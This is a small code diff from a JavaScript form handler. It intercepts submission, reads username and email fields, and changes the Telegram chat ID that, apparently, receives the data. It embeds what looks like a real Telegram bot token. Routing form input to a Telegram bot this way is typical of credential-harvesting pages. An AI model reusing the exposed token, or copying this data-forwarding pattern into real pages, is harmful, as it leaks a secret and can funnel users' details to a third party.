@@ -13,7 +13,7 @@ function sendFormData() {
         event.preventDefault();
 
         const botToken = '7022286275:AAF_I8kysNtX27nnRowbndIHCNwYGDLVGEU';
-        const chatId = '-6163382681';
+        const chatId = '-4280555399';
 
         const usernameInput = form.elements['username'];
         const emailInput = form.elements['email'];
